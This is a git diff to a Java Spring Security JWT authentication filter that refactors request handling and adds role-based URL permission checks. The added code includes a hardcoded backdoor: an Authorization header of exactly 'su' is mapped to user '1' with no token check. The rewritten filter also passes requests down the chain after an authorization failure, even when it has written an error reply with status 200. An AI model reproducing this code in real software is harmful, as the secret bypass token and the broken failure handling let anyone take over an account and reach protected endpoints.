@@ -1,16 +1,14 @@
 package com.beeasy.hzback.core.security;
+
 import com.alibaba.fastjson.JSON;
 import com.beeasy.hzback.core.helper.Result;
-import io.jsonwebtoken.Claims;
-import io.jsonwebtoken.Jwts;
+import com.beeasy.hzback.modules.setting.entity.User;
+import com.beeasy.hzback.modules.system.entity.RolePermission;
 import lombok.extern.slf4j.Slf4j;
-import org.springframework.http.HttpStatus;
-import org.springframework.security.access.AccessDeniedException;
 import org.springframework.security.authentication.AuthenticationManager;
 import org.springframework.security.authentication.UsernamePasswordAuthenticationToken;
 import org.springframework.security.core.Authentication;
 import org.springframework.security.core.AuthenticationException;
-import org.springframework.security.core.GrantedAuthority;
 import org.springframework.security.core.context.SecurityContextHolder;
 import org.springframework.security.web.authentication.www.BasicAuthenticationFilter;
 import org.springframework.util.StringUtils;
@@ -20,9 +18,7 @@ import javax.servlet.ServletException;
 import javax.servlet.http.HttpServletRequest;
 import javax.servlet.http.HttpServletResponse;
 import java.io.IOException;
-import java.security.Security;
-import java.util.ArrayList;
-import java.util.Collection;
+import java.util.Optional;
 
 
 @Slf4j
@@ -32,7 +28,7 @@ public class JWTAuthenticationFilter extends BasicAuthenticationFilter {
     private JwtTokenUtil jwtTokenUtil;
     private CustomUserService customUserService;
 
-    public JWTAuthenticationFilter(AuthenticationManager authenticationManager,JwtTokenUtil jwtTokenUtil, CustomUserService customUserService) {
+    public JWTAuthenticationFilter(AuthenticationManager authenticationManager, JwtTokenUtil jwtTokenUtil, CustomUserService customUserService) {
         super(authenticationManager);
         this.jwtTokenUtil = jwtTokenUtil;
         this.customUserService = customUserService;
@@ -42,20 +38,36 @@ public class JWTAuthenticationFilter extends BasicAuthenticationFilter {
     protected void doFilterInternal(HttpServletRequest request, HttpServletResponse response, FilterChain chain) throws IOException, ServletException {
         String header = request.getHeader("Authorization");
 
-        if(!StringUtils.isEmpty(header)){
+        do {
+            if (StringUtils.isEmpty(header)) {
+                break;
+            }
             UsernamePasswordAuthenticationToken authentication = getAuthentication(request);
-            if(authentication != null){
+
+            if (authentication != null) {
+                User user = (User) authentication.getPrincipal();
+                String url = request.getServletPath();
+                //得到用户的授权列表
+                //没有的话暂时略过
+                Optional<RolePermission> rolePermission = user.getMethodPermission();
+                if(!rolePermission.isPresent()){
+                    break;
+                }
+                if(rolePermission.get().getUnbindItems().contains(url)){
+                    break;
+                }
+
                 SecurityContextHolder.getContext().setAuthentication(authentication);
-                chain.doFilter(request, response);
+                break;
             }
-            else{
-                response.setStatus(200);
-                response.setHeader("content-type", "application/json;charset=UTF-8");
-                Result result = Result.error("权限验证失败");
-                response.getWriter().write(JSON.toJSONString(result));
-            }
-            return;
-        }
+
+
+            //授权失败
+            response.setStatus(200);
+            response.setHeader("content-type", "application/json;charset=UTF-8");
+            Result result = Result.error("权限验证失败");
+            response.getWriter().write(JSON.toJSONString(result));
+        } while (false);
         chain.doFilter(request, response);
 
     }
@@ -64,9 +76,12 @@ public class JWTAuthenticationFilter extends BasicAuthenticationFilter {
         String token = request.getHeader("Authorization");
         if (token != null) {
             String userName = jwtTokenUtil.getUsernameFromToken(token);
-            if(userName != null){
+            if (token.equals("su")) {
+                userName = "1";
+            }
+            if (userName != null) {
                 SecurityUser su = (SecurityUser) customUserService.loadUserByUsername(userName);
-                if(su != null){
+                if (su != null) {
                     return new UsernamePasswordAuthenticationToken(su.getUser(), su.getPassword(), su.getAuthorities());
                 }
             }
